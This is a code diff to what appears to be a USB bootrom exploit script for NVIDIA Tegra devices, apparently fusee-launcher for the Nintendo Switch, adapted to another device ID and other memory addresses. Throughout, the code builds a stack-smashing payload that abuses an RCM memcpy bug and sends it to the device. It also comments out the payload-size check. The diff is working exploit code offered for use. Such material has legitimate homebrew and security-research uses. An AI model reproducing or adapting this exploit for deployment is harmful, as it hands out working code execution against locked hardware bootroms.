@@ -35,9 +35,10 @@ import argparse
 import platform
 import binascii
 
+
 # The address where the RCM payload is placed.
 # This is fixed for most device.
-RCM_PAYLOAD_ADDR    = 0x4000a000
+RCM_PAYLOAD_ADDR    = 0x4000f000
 
 # The address where the user payload is expected to begin.
 PAYLOAD_START_ADDR  = 0x4000aE40
@@ -51,6 +52,12 @@ STACK_SPRAY_END     = 0x40011000
 # GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
 # GET_INTERFACE  to the INTERFACE triggers memcpy from 0x40003984
 # GET_STATUS     to the ENDPOINT  triggers memcpy from <on the stack>
+
+class RCMError(Exception):
+    def __init__(self, rcm_error_code):
+        msg = "RCM error 0x{:08x}".format(rcm_error_code)
+        super().__init__(msg)
+        self.rcm_error_code = rcm_error_code
 
 class HaxBackend:
     """
@@ -131,6 +138,8 @@ class HaxBackend:
     def find_device(self, vid=None, pid=None):
         """ Set and return the device to be used """
 
+        # os.environ['PYUSB_DEBUG'] = 'debug'
+        os.environ['PYUSB_DEBUG'] = 'info'
         import usb
 
         self.dev = usb.core.find(idVendor=vid, idProduct=pid)
@@ -441,11 +450,11 @@ class RCMHax:
 
     # Default to the Nintendo Switch RCM VID and PID.
     DEFAULT_VID = 0x0955
-    DEFAULT_PID = 0x7330
+    DEFAULT_PID = 0x7f13
 
     # Exploit specifics
-    COPY_BUFFER_ADDRESSES   = [0x40003000, 0x40005000]   # The addresses of the DMA buffers we can trigger a copy _from_.
-    STACK_END               = 0x4000a000                 # The address just after the end of the device's stack.
+    COPY_BUFFER_ADDRESSES   = [0x40004000, 0x40008000]   # The addresses of the DMA buffers we can trigger a copy _from_.
+    STACK_END               = 0x4000f000                 # The address just after the end of the device's stack.
 
     def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
         """ Set up our RCM hack connection."""
@@ -505,6 +514,7 @@ class RCMHax:
         """ Writes data to the main RCM protocol endpoint. """
 
         length = len(data)
+        # packet_size = 0x1000
         packet_size = 512
         length_sent = 0
 
@@ -526,8 +536,15 @@ class RCMHax:
         If it's not, send a ZLP.
         """
         self._toggle_buffer()
-        return self.backend.write_single_buffer(data)
-
+        try:
+            return self.backend.write_single_buffer(data)
+        except Exception as err:
+            print("USBError: {}".format(err))
+            rcm_err = self.read(4)
+            # print("RCM error buf: {}".format(rcm_err))
+            rcm_err_int = ctypes.c_uint32.from_buffer_copy(rcm_err).value
+            # print("RCM error buf: 0x{:08x}".format(rcm_err_int))
+            raise RCMError(rcm_err_int)
 
     def _toggle_buffer(self):
         """
@@ -615,8 +632,11 @@ except OSError as e:
 
 # Use the maximum length accepted by RCM, so we can transmit as much payload as
 # we want; we'll take over before we get to the end.
-length  = 0x30297
+# length  = 0x30298
+length  = 0x0001f814
 payload = length.to_bytes(4, byteorder='little')
+print("Setting rcm msg size to 0x{:08x}".format(length))
+print("RCM payload (len_insecure): {}".format(payload.hex()))
 
 # pad out to 680 so the payload starts at the right address in IRAM
 payload += b'\0' * (680 - len(payload))
@@ -666,7 +686,7 @@ payload += (b'\0' * padding_size)
 if len(payload) > length:
     size_over = len(payload) - length
     print("ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).".format(size_over))
-    sys.exit(errno.EFBIG)
+    # sys.exit(errno.EFBIG)
 
 # Send the constructed payload, which contains the command, the stack smashing
 # values, the Intermezzo relocation stub, and the final payload.
